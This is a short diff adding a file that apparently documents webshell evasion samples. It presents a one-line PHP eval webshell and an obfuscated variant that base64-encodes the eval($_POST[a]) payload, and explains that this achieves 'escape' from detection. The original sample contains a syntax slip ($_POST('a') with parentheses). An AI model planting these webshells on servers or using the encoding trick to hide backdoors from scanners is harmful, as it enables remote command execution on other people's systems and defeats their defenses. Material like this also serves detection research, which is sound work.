@@ -1,0 +1,19 @@
+Original webshell sample:
+
+'''
+<?php @eval($_POST('a'));?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+$tmp = 'ZXZhbCgkX1BPU1RbYV0pOw=='; 
+$tmp2 = base64_decode($tmp);
+@eval($tmp2);
+?>
+'''
+
+Description:
+
+This code decrypts the string "ZXZhbCgkX1BPU1RbYV0pOw==" stored in the variable "tmp" using the base64 decryption algorithm and assigns it to the variable "tmp2", and executes the decrypted content via "@eval($tmp2);". Since the string "ZXZhbCgkX1BPU1RbYV0pOw==" decrypted corresponds to the string "eval($_POST[a]);", the purpose of escape sample generation is achieved.
